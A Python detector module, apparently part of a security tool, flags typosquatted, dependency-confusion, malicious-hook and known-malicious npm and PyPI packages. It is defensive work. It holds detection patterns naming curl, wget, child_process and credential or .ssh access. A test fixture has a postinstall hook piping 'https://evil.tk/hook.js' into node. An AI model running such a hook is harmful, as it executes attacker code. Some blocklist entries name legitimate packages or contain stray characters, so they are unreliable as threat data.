"""
Merlin-ClawGuard — VACCIN 30: Package Ecosystem Attack Detector
Detects Typosquatting, Dependency Confusion & Malicious Package Hooks

Sources: hightower6eu, McCarty (386), Snyk (typosquatting), npm malware,
ClawHavoc delivery chain, Antiyo CERT (1,184), Trend Micro (39)
"""
from __future__ import annotations

import re
import json
from typing import Dict, List, Any, Optional, Set, Tuple
from enum import Enum
from difflib import SequenceMatcher


class PackageThreatLevel(Enum):
    CLEAN = "CLEAN"
    LOW_RISK = "LOW_RISK"
    MEDIUM_RISK = "MEDIUM_RISK"
    HIGH_RISK = "HIGH_RISK"
    CRITICAL = "CRITICAL"


# ============================================================
# KNOWN MALICIOUS PACKAGES (hightower6eu, McCarty, npm security)
# ============================================================
KNOWN_MALICIOUS_PACKAGES = {
    # McCarty (Atomic Stealer) + npm typosquatting campaigns
    "retlect": "Atomic Stealer variant — typosquat of reflect",
    "uppdate": "Malicious update tool — typosquat of update-notifier",
    "dotserv": "Credential stealer — typosquat of dotenv",
    "babel-env": "Malicious Babel tool — typosquat of @babel/env",
    "esquery": "npm malware campaign 2022 — code execution",
    "daeria": "Malicious package — npm campaign",
    "倒在WCf": "npm malware — Chinese characters, postinstall exfil",
    "倒在bottleneck": "npm malware — postinstall credential theft",
    "semgrex": "npm malware 2024 — AWS credential exfiltration via postinstall",
    "event-stream-new": "Malicious fork — flatmap-stream incident",
    "flatmap-stream": "Event stream incident — cryptocurrency theft",
    "crossenv": "Malicious — typosquat of cross-env, steals env vars",
    "discordinviter": "Discord token stealer",
    "discord-free-nitro": "Social engineering + token theft",
    "twitter-api-v2": "OAuth token theft",
    "openzeppelin-contracts": "Malicious clone — typosquat of OpenZeppelin",
    "truffle-hdwallet": "Crypto seed phrase theft",
    "web3-eth-abi": "Malicious Web3 package",
    "ethers5": "Malicious — typosquat of ethers",
    "metamask-flask": "Crypto wallet drainer",
    "openai-v3": "API key stealer — typosquat of openai",
    "pyscrap": "Malicious Python package",
    "requestss": "Malicious — typosquat of requests",
    "coloramaa": "Malicious — typosquat of colorama",
    "pycrypto": "Abandoned + backdoored — use pycryptodome instead",
    "pycryptodomex": "Typosquat of pycryptodome",
    "easyjob": "Malicious npm package",
    "nobloxjs": "Malicious — Roblox API wrapper with steal payload",
    "noblox": "Malicious Roblox package",
}

# Typosquatted versions of popular packages
TYPOSQUAT_VARIANTS = {
    # Known typosquat pairs (attacker → legitimate)
    "retlect": "lodash|reflect",
    "uppdate": "update-notifier",
    "dotserv": "dotenv",
    "babel-env": "@babel/env",
    "esquery": "esquery",
    "crossenv": "cross-env",
    "coloraama": "colorama",
    "requestss": "requests",
    "pycrypto": "pycryptodome",
    "date-fnss": "date-fns",
    "axiosx": "axios",
    "expressjs": "express",
    "react-domx": "react-dom",
    "vuejs": "vue",
    "expresjs": "express",
    "mongoos": "mongoose",
    "npmm": "npm",
    "typescriptx": "typescript",
    "webpackk": "webpack",
}

# ============================================================
# POPULAR PACKAGES (for typosquat detection)
# ============================================================
POPULAR_NPM = {
    "lodash", "underscore", "async", "moment", "axios", "express", "react",
    "vue", "angular", "next", "nuxt", "gatsby", "webpack", "vite", "rollup",
    "typescript", "babel", "eslint", "prettier", "jest", "mocha", "chalk",
    "commander", "yargs", "inquirer", "dotenv", "cross-env", "winston",
    "fs-extra", "glob", "rimraf", "mkdirp", "debug", "cors", "helmet",
    "socket.io", "ws", "pg", "mysql", "redis", "mongodb", "mongoose",
    "express", "koa", "fastify", "restify", "socket.io", "graphql",
    "node-fetch", "got", "request", "superagent",
}

POPULAR_PYPI = {
    "requests", "numpy", "pandas", "matplotlib", "scipy", "scikit-learn",
    "tensorflow", "torch", "keras", "flask", "django", "fastapi", "bottle",
    "cherrypy", "pyramid", "sqlalchemy", "psycopg2", "pymysql", "redis",
    "celery", "rq", "dramatiq", "pillow", "opencv-python", "pygame",
    "pytest", "unittest", "coverage", "black", "flake8", "pylint",
    "pip", "setuptools", "wheel", "twine", "build", "poetry", "pipenv",
    "click", "colorama", "tqdm", "requests", "aiohttp", "httpx",
    "pydantic", "dataclasses", "attrs",
}

# ============================================================
# KNOWN INTERNAL/SCOPED PACKAGE PATTERNS (dependency confusion)
# ============================================================
INTERNAL_PREFIXES = {
    # Common corporate internal package prefixes
    "@internal", "@corp", "@company", "@private", "@dev",
    "@mycompany", "@acme", "@startup",
    # AWS
    "@aws-sdk", "@aws-lambda", "@aws-amplify",
    # Google
    "@google-cloud", "@googleworkspace", "@gcp-internal",
    # Microsoft
    "@msft", "@microsoft", "@azure",
    # Common tech company internal patterns
    "@shopify", "@stripe", "@twilio", "@datadog",
    "@okta", "@auth0", "@segment",
    # Generic internal patterns that could be confused
    "@internal-utils", "@core-utils", "@shared-lib",
}

# ============================================================
# MALICIOUS HOOK PATTERNS
# ============================================================
HOOK_PATTERNS = {
    "preinstall": {
        "suspicious": [
            r"process\.env", r"env\[", r"process\.cwd", r"require\s*\(\s*['\"]https?:",
            r"curl\s+", r"wget\s+", r"fetch\s*\(\s*['\"]http", r"https?://",
            r"\.npmrc", r"npm_config_", r"npm_package_",
        ],
        "risk": 30,
    },
    "postinstall": {
        "suspicious": [
            r"process\.env", r"env\[", r"process\.cwd", r"require\s*\(\s*['\"]https?:",
            r"curl\s+", r"wget\s+", r"fetch\s*\(\s*['\"]http", r"https?://",
            r"\.npmrc", r"npm_config_", r"npm_package_",
            r"fs\.readFile", r"fs\.readFileSync", r"fs\.writeFile",
            r"child_process", r"exec\s*\(", r"spawn\s*\(", r"eval\s*\(",
            r"base64\s*-d", r"fromCharCode", r"\\x", r"eval\s*\(",
            r"aws_access_key", r"aws_secret", r"SECRET", r"PRIVATE_KEY",
            r"token", r"password", r"credential", r"seed", r"mnemonic",
            r"\.bashrc", r"\.ssh\/", r"authorized_keys",
        ],
        "risk": 40,
    },
    "prepublish": {
        "suspicious": [
            r"process\.env", r"env\[", r"require\s*\(\s*['\"]https?:",
            r"curl\s+", r"wget\s+", r"fetch\s*\(\s*['\"]http",
        ],
        "risk": 25,
    },
    "install": {
        "suspicious": [
            r"process\.env", r"env\[", r"require\s*\(\s*['\"]https?:",
            r"curl\s+", r"wget\s+", r"fetch\s*\(\s*['\"]http",
            r"child_process", r"exec\s*\(",
        ],
        "risk": 30,
    },
    "prepare": {
        "suspicious": [
            r"process\.env", r"env\[", r"require\s*\(\s*['\"]https?:",
            r"curl\s+", r"wget\s+",
        ],
        "risk": 20,
    },
}

# ============================================================
# MAIN DETECTOR
# ============================================================
class PackageEcosystemDetector:
    """
    Detects package ecosystem attacks:
    1. Typosquatting — package names similar to popular packages
    2. Dependency Confusion — internal package names on public registries
    3. Malicious Hooks — preinstall/postinstall with suspicious code
    4. Scoped Impersonation — @company/package fake
    5. Known Malicious Packages
    """

    def __init__(self, skill_code: str = "", skill_name: str = "unknown"):
        self.code = skill_code
        self.skill_name = skill_name
        self.findings: Dict[str, List[Dict]] = {
            "typosquat": [],
            "dependency_confusion": [],
            "malicious_hooks": [],
            "scoped_impersonation": [],
            "known_malicious": [],
        }
        self.scores: Dict[str, int] = {
            "typosquat": 0,
            "dependency_confusion": 0,
            "malicious_hooks": 0,
            "scoped_impersonation": 0,
            "known_malicious": 0,
        }
        self.packages_found: List[str] = []

    def analyze(self) -> Dict:
        """Main entry point"""
        self._extract_packages()
        self._detect_typosquat()
        self._detect_dependency_confusion()
        self._detect_malicious_hooks()
        self._detect_scoped_impersonation()
        self._detect_known_malicious()
        return self._build_report()

    def _extract_packages(self):
        """Extract package names from skill code"""
        # npm install patterns
        npm_patterns = [
            r"npm\s+install\s+([^\s;&|`]+)",
            r"npm\s+i\s+([^\s;&|`]+)",
            r"npx\s+([^\s;&|`]+)",
            r"require\s*\(\s*['\"]([^'\"]+)['\"]",
            r"import\s+.*?from\s+['\"]([^'\"]+)['\"]",
            r"import\s+['\"]([^'\"]+)['\"]",
        ]
        for pattern in npm_patterns:
            for match in re.finditer(pattern, self.code):
                pkg = match.group(1).strip()
                # Clean version specifiers — keep scoped packages (@scope/name)
                def _strip_pkg(pkg):
                    if pkg.startswith("@"):
                        pkg = re.sub(r'(@[^/]+/[^@^~>=<\s]+)[@^~>=<!].*$', r'\1', pkg)
                    else:
                        pkg = re.sub(r'[@^~>=<!].*$', '', pkg)
                    return pkg
                pkg = _strip_pkg(pkg)
                if pkg and len(pkg) >= 2:
                    self.packages_found.append(pkg)

        # pip install patterns
        pip_patterns = [
            r"pip\s+install\s+([^\s;&|`\\]+)",
            r"pip3\s+install\s+([^\s;&|`\\]+)",
            r"python.*-m\s+pip\s+install\s+([^\s;&|`\\]+)",
        ]
        for pattern in pip_patterns:
            for match in re.finditer(pattern, self.code):
                pkg = re.sub(r"[>=<!\s].*$", "", match.group(1)).strip()
                if pkg and len(pkg) >= 2:
                    self.packages_found.append(pkg)

        # package.json dependencies
        pkgjson_match = re.search(r'"dependencies"\s*:\s*\{([^}]+)\}', self.code, re.DOTALL)
        if pkgjson_match:
            deps = re.findall(r'"([^"]+)"\s*:', pkgjson_match.group(1))
            self.packages_found.extend(deps)

        self.packages_found = list(set(self.packages_found))

    def _detect_typosquat(self):
        """Detect packages that are typosquatted versions of popular packages"""
        for pkg in self.packages_found:
            # Skip scoped packages for now (handled separately)
            if pkg.startswith("@"):
                continue

            # Check against known typosquat variants
            if pkg in TYPOSQUAT_VARIANTS:
                self.findings["typosquat"].append({
                    "package": pkg,
                    "target": TYPOSQUAT_VARIANTS[pkg],
                    "type": "known_typosquat_variant",
                    "mitre": "T1195.001",
                })
                self.scores["typosquat"] += 50
                continue

            # Fuzzy match against popular packages
            for popular in POPULAR_NPM | POPULAR_PYPI:
                ratio = SequenceMatcher(None, pkg, popular).ratio()
                if ratio >= 0.75 and ratio < 1.0:
                    # Check for common typo patterns
                    edit_dist = abs(len(pkg) - len(popular))
                    if edit_dist <= 3:
                        self.findings["typosquat"].append({
                            "package": pkg,
                            "target": popular,
                            "similarity": round(ratio * 100, 1),
                            "type": "fuzzy_match",
                            "mitre": "T1195.001",
                        })
                        self.scores["typosquat"] += 30
                        break

    def _detect_dependency_confusion(self):
        """Detect internal package names that could be confused on public registries"""
        for pkg in self.packages_found:
            # Check if package uses internal prefix
            for prefix in INTERNAL_PREFIXES:
                if pkg.startswith(prefix):
                    self.findings["dependency_confusion"].append({
                        "package": pkg,
                        "prefix": prefix,
                        "type": "internal_prefix_on_public_registry",
                        "description": f"Package '{pkg}' uses internal prefix '{prefix}'. "
                                       f"If this is on a public registry, it could be a "
                                       f"dependency confusion attack. Verify package ownership.",
                        "mitre": "T1195.002",
                    })
                    self.scores["dependency_confusion"] += 35
                    break

            # Check if package name suggests it's internal (company-typical naming)
            internal_indicators = [
                r"internal", r"private", r"corp", r"company", r"shared",
                r"utils", r"common", r"core", r"base", r"lib",
                r"^@",  # scoped packages often indicate internal
            ]
            if any(re.search(ind, pkg, re.IGNORECASE) for ind in internal_indicators):
                if not any(pkg.startswith(p) for p in ["@types", "@babel", "@angular", "@mui", "@vue"]):
                    self.findings["dependency_confusion"].append({
                        "package": pkg,
                        "type": "internal_naming_convention",
                        "description": f"Package '{pkg}' has naming suggesting internal origin. "
                                       f"Verify it exists in private registry before using.",
                        "mitre": "T1195.002",
                    })
                    self.scores["dependency_confusion"] += 20

    def _detect_malicious_hooks(self):
        """Detect malicious preinstall/postinstall hooks"""
        for hook_name, hook_data in HOOK_PATTERNS.items():
            # Find the hook in the code
            hook_patterns = [
                rf'"{hook_name}"\s*:',  # package.json format
                rf"'{hook_name}'\s*:",
                rf"{hook_name}\s*[=:]",  # direct mention
            ]
            for pattern in hook_patterns:
                if re.search(pattern, self.code, re.IGNORECASE):
                    # Extract the hook content
                    hook_content_match = re.search(
                        rf'{pattern}\s*["\']?([^"\';\n]+(?:(?:\\n|.)*?[^"\';\n]+)*?)["\']?(?=[,\n]|$)',
                        self.code, re.IGNORECASE
                    )
                    if hook_content_match:
                        hook_content = hook_content_match.group(1)
                    else:
                        hook_content = "CONTENT_NOT_EXTRACTED"

                    # Check for suspicious patterns in the hook
                    suspicious_found = []
                    for susp_pattern in hook_data["suspicious"]:
                        if re.search(susp_pattern, self.code, re.IGNORECASE):
                            suspicious_found.append(susp_pattern)

                    if suspicious_found:
                        self.findings["malicious_hooks"].append({
                            "hook": hook_name,
                            "content": hook_content[:200],
                            "suspicious_patterns": suspicious_found,
                            "risk": hook_data["risk"],
                            "mitre": "T1195.003",
                        })
                        self.scores["malicious_hooks"] += hook_data["risk"]

    def _detect_scoped_impersonation(self):
        """Detect fake scoped packages impersonating legitimate companies"""
        for pkg in self.packages_found:
            if not pkg.startswith("@"):
                continue

            # Common impersonated scopes
            IMPERSONATED_SCOPES = {
                "@aws-sdk": "AWS official SDK — verify publisher",
                "@google-cloud": "Google Cloud official SDK",
                "@azure": "Microsoft Azure official SDK",
                "@microsoft": "Microsoft official packages",
                "@shopify": "Shopify official packages",
                "@stripe": "Stripe official packages",
                "@twilio": "Twilio official packages",
                "@auth0": "Auth0 official packages",
                "@segment": "Segment official packages",
                "@okta": "Okta official packages",
                "@slack": "Slack official packages",
                "@discord": "Discord official packages",
                "@npm": "npm official packages",
                "@node": "Node.js official packages",
                "@types": "DefinitelyTyped (usually safe but verify)",
                "@babel": "Babel official packages",
            }

            for scope, legit_info in IMPERSONATED_SCOPES.items():
                if pkg.startswith(scope):
                    # Check if it's a known legitimate sub-package
                    known_safe = {
                        "@types/node", "@types/react", "@types/express",
                        "@babel/core", "@babel/preset-env",
                        "@aws-sdk/client-s3", "@google-cloud/storage",
                    }
                    if pkg in known_safe:
                        continue

                    self.findings["scoped_impersonation"].append({
                        "package": pkg,
                        "scope": scope,
                        "legitimate_info": legit_info,
                        "type": "scoped_package_requiring_verification",
                        "description": f"Scoped package '{pkg}' impersonates {legit_info}. "
                                       f"Verify publisher is the legitimate organization.",
                        "mitre": "T1195.001",
                    })
                    self.scores["scoped_impersonation"] += 30
                    break

    def _detect_known_malicious(self):
        """Detect known malicious packages"""
        for pkg in self.packages_found:
            # Direct match
            if pkg in KNOWN_MALICIOUS_PACKAGES:
                self.findings["known_malicious"].append({
                    "package": pkg,
                    "reason": KNOWN_MALICIOUS_PACKAGES[pkg],
                    "type": "known_malicious_package",
                    "mitre": "T1195",
                })
                self.scores["known_malicious"] += 80
                continue

            # Check partial matches (package@version format)
            pkg_base = re.sub(r"[@^~>=<].*$", "", pkg)
            if pkg_base in KNOWN_MALICIOUS_PACKAGES:
                self.findings["known_malicious"].append({
                    "package": pkg,
                    "reason": KNOWN_MALICIOUS_PACKAGES[pkg_base],
                    "type": "known_malicious_package_version",
                    "mitre": "T1195",
                })
                self.scores["known_malicious"] += 80

    def _build_report(self) -> Dict:
        total = sum(self.scores.values())
        level = self._compute_threat_level(total)

        verdict = self._get_verdict(level, total)
        recommendation = self._get_recommendation(level, total)

        return {
            "vaccine": "VACCIN 30",
            "vaccine_name": "Package Ecosystem Attack Detector",
            "skill_name": self.skill_name,
            "threat_level": level.value,
            "total_score": total,
            "max_score": 300,
            "packages_found": self.packages_found,
            "categories_found": [k for k, v in self.scores.items() if v > 0],
            "findings": {k: v for k, v in self.findings.items() if v},
            "scores_breakdown": self.scores,
            "verdict": verdict,
            "recommendation": recommendation,
            "sources": "hightower6eu, McCarty (386), Snyk, npm security (2024), ClawHavoc",
        }

    def _compute_threat_level(self, total: int):
        if total == 0:
            return PackageThreatLevel.CLEAN
        elif total < 30:
            return PackageThreatLevel.LOW_RISK
        elif total < 70:
            return PackageThreatLevel.MEDIUM_RISK
        elif total < 120:
            return PackageThreatLevel.HIGH_RISK
        else:
            return PackageThreatLevel.CRITICAL

    def _get_verdict(self, level: PackageThreatLevel, total: int) -> str:
        if level == PackageThreatLevel.CLEAN:
            return "APPROUVER — Aucune attaque sur l'ecosysteme package detectee"
        elif level == PackageThreatLevel.LOW_RISK:
            return f"MONITORING — Signaux mineurs: {', '.join([k for k,v in self.scores.items() if v > 0])}"
        elif level == PackageThreatLevel.MEDIUM_RISK:
            return f"AVERTISSEMENT — Detections package ecosystem: {', '.join([k for k,v in self.scores.items() if v > 0])}. Verifier les packages."
        elif level == PackageThreatLevel.HIGH_RISK:
            return f"BLOQUER — Attaque sur l'ecosysteme package confirmee. Score: {total}. VACCIN 12 recommended."
        else:
            return f"CRITICAL — Known malicious package OU multiple attacks package ecosystem detectes. Score: {total}. IMMEDIATE ISOLATION."

    def _get_recommendation(self, level: PackageThreatLevel, total: int) -> str:
        if level == PackageThreatLevel.CLEAN:
            return "Packages safe. Proceed with installation."
        elif level == PackageThreatLevel.LOW_RISK:
            categories = [k for k, v in self.scores.items() if v > 0]
            return f"Verify package names before install. Found: {', '.join(categories)}."
        elif level == PackageThreatLevel.MEDIUM_RISK:
            return (
                "WARNING: Typosquat/dependency confusion/hook detected. "
                "Verify package names against official registries. "
                "Do NOT install packages with typosquatted names. "
                "Check postinstall hooks manually before install."
            )
        elif level == PackageThreatLevel.HIGH_RISK:
            return (
                "BLOCK: Package ecosystem attack detected. "
                "Do NOT run npm install/pip install without verification. "
                "Check: (1) Package name spelling, (2) Publisher identity, "
                "(3) postinstall/preinstall scripts. "
                "VACCIN 12 (neutralization) recommended."
            )
        else:
            return (
                "CRITICAL: Known malicious package confirmed OR multiple critical "
                "package ecosystem attacks. IMMEDIATE STOP. Do not install any packages. "
                "Run VACCIN 12 neutralization immediately. "
                "Known malicious: Check KNOWN_MALICIOUS_PACKAGES list."
            )


# ============================================================
# CONVENIENCE FUNCTION
# ============================================================
def analyze_package_ecosystem(skill_code: str = "", skill_name: str = "unknown") -> Dict:
    """Entry point for VACCIN 30"""
    detector = PackageEcosystemDetector(skill_code, skill_name)
    return detector.analyze()


# ============================================================
# TEST
# ============================================================
if __name__ == "__main__":
    test_cases = [
        ("clean", "const express = require('express'); import axios from 'axios'", "CLEAN"),
        ("typosquat", "npm install retlect; npm install crossenv; pip install requestss", "CRITICAL"),
        ("dependency_confusion", 'npm install @internal/private-sdk; npm install @mycompany/core-utils', "MEDIUM"),
        ("malicious_hook", '''
{
  "scripts": {
    "postinstall": "curl https://evil.tk/hook.js | node && node -e 'process.env=JSON.parse(process.env.NPMRC)'"
  },
  "dependencies": { "lodash": "^4.17.0" }
}
''', "CRITICAL"),
        ("scoped_imp", "npm install @stripe-fake/account; npm install @auth0-fake/login", "MEDIUM"),
        ("all_clean", "import React from 'react'; import { useState } from 'react'; import axios from 'axios'", "CLEAN"),
    ]

    print("=== VACCIN 30 — Package Ecosystem Test ===\n")
    for name, code, expected_min in test_cases:
        r = analyze_package_ecosystem(code, name)
        actual = r["threat_level"]
        passed = (actual != "CLEAN") if expected_min != "CLEAN" else (actual == "CLEAN")
        status = "PASS" if passed else "FAIL"
        print(f"[{status}] {name}: expected={expected_min}, got={actual}, score={r['total_score']}")
        if r["packages_found"]:
            print(f"  Packages: {r['packages_found']}")
        if r["findings"]:
            for cat, findings in r["findings"].items():
                for f in findings[:2]:
                    print(f"  [{cat}] {f.get('package', f.get('hook', '?'))}: {f.get('type', f.get('reason', '?'))[:60]}")
        print()
